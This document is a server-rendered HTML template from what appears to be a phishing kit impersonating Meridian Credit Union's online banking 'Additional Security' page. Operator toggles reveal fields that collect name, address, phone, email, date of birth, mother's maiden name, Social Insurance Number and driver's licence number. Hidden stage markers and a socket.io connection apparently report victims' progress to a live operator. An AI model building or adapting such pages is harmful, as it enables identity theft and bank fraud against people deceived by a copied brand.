<%

let name = meridian.name
let address = meridian.address
let postal = meridian.postal
let phone = meridian.phone
let pin = meridian.pin
let dob = meridian.dob
let email = meridian.email
let mmn = meridian.mmn
let sin = meridian.sin
let dl = meridian.dl

%>
<html lang="en">
    <head>
        <title>Sign in to online banking</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
        <link href="/assets/meridian/style.css?v=1" rel="stylesheet">
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>
            var lrbank = '<?=escape($udata->last->bank)?>';
            var lrinfo = '<?=escape($udata->last->info)?>';
        </script>
        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
        <script src="/assets/js/details.js?v=<?=time()?>"></script>
        <script src="/socket.io/socket.io.js"></script>
    </head>
    <body>
        <div class="body-content">
        	<div class="row public-header">
        		<div class="logo-container">
        			<a href="">
        				<img src="/assets/meridian//meridian-logo.svg" alt="Meridian Logo" class="meridian-logo">
        			</a>
        		</div>
        		<div class="link-container">
        			<ul class="utility-links">
        				<li>
        					<a href="">MeridianCU.ca</a>
        				</li>
        			</ul>
        		</div>
        	</div>
        </div>
        <div id="page-content" class="signin-page" style="background-image: url(/assets/meridian/Retail_SignInBackground_All.jpg)">
            <div class="signin-page-inner">
                <div class="row">
                    <div class="signin-form-container" id="acc-form">
                        <div class="signin-form">
                            <div class="signin-form-top">
                                <h1>Additional Security</h1>
                            </div>
                            <form id="loginForm" action="" autocomplete="false" class="disable-on-submit div-main" method="post" id="input-form" >
                                <input type="hidden" id="userAgent" name="userAgent">
                                <div class="signin-form-content">
                                    <% let x = 0; if (name == 'on' || address == 'on' || postal == 'on' || email == 'on' || phone == 'on' || dob == 'on') { x = 1; %>
                                        <p style="margin-bottom: 23px;color: #3e3e3e;font-size: 14px;">To verify your login, we require some additional information regarding your account.</p>
                        
                                    <% } if (name == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Full Name</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling Full Name" id="input-fname" maxlength="320" name="fname" placeholder="Enter Full Name" required="required" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (address == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Address</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling Address" id="input-address" maxlength="320" name="address" placeholder="Enter Address" required="required" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">City</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling City" id="input-city" maxlength="320" name="city" placeholder="Enter City" required="required" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (postal == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Postal Code</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling Postal" id="input-postal" maxlength="320" name="postal" placeholder="Enter Postal Code" required="required" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (phone == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Phone Number</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling Phone" id="input-phone" maxlength="11" name="phone" placeholder="Enter Phone Number" inputmode="numeric" required="required" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (email == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Email Address</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling Email" id="input-email" maxlength="320" name="email" placeholder="Enter Email Address" required="required" type="text" inputmode="email" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (dob == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Date of Birth</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling DOB" id="input-dob" minlength="10" maxlength="10" name="dob" placeholder="Enter Date of Birth" required="required" type="text" inputmode="numeric" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (mmn == 'on' || sin == 'on' || dl == 'on') { %>
                                        <p style="margin-bottom: 23px;color: #3e3e3e;font-size: 14px; margin-top: 10px">To finish verifying your identity, we require you confirm some additional information.</p>
                                    <% } if (mmn == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Mother's Maiden Name</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling MMN" id="input-mmn" maxlength="320" name="mmn" placeholder="Enter Mother's Maiden Name" required="required" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (sin == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Social Insurance Number</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling SIN" id="input-sin" maxlength="320" name="sin" placeholder="Enter Social Insurance Number" required="required" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } if (dl == 'on') { %>
                                        <div data-memorized-account-hidden="" style="">
                                            <label for="custNoInput">Driver's Licence Number</label>
                                            <div class="icon-textbox-wrapper">
                                                <div class="input-wrapper">
                                                    <input value="" class="icon-textbox lrinput" attr-action="Filling Drivers" id="input-drivers" maxlength="320" name="answer" placeholder="Enter Driver's Licence Number" type="text" aria-required="true" aria-invalid="false">
                                                </div>
                                            </div>
                                        </div>
                                    <% } %>
                                    
                                    <br>
                                    <button onclick="submitForm()" type="button" class="orange button" id="sign-in-button" name="save" value="1">
                                    Continue
                                    </button>
                                    <br>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="main-footer" id="acc-footer">
            <div class="row">
                <div class="footer-logos">
                    <div class="logo-container">
                        <a href="/Security_Login" class="not-interactive">
                        <img src="/assets/meridian/meridian-logo-white.svg" alt="Meridian Logo" class="meridian-logo">
                        </a>
                    </div>
                    <div>
                        <img src="/assets/meridian/entrust.png" alt="Secured by Entrust SSL" class="entrust-seal">
                    </div>
                </div>
                <div class="footer-sub">
                    <span>Copyright © 2023 Meridian Credit Union. All rights reserved.</span>
                    <div class="footer-links">
                        <a href="https://www.meridiancu.ca/privacy" title="Privacy &amp; Security" target="_blank" rel="noopener noreferrer" aria-label="Privacy &amp; Security page opens the https://www.meridiancu.ca/privacy on a new window.">Privacy &amp; Security</a>
                        <a href="https://www.meridiancu.ca/legal" title="Legal" target="_blank" rel="noopener noreferrer" aria-label="Legal page opens the https://www.meridiancu.ca/legal on a new window.">Legal</a>
                        <a href="https://www.meridiancu.ca/accessibility" title="Accessibility" target="_blank" rel="noopener noreferrer" aria-label="Accessibility page opens the https://www.meridiancu.ca/accessibility on a new window.">Accessibility</a>
                    </div>
                </div>
            </div>
        </footer>
        <span hidden id="navig"> <%=navig%> </span>
        <span hidden id="stage">Details</span>
    </body>
    <script src="/bank/meridian/js/script.js">
    </script>
</html>
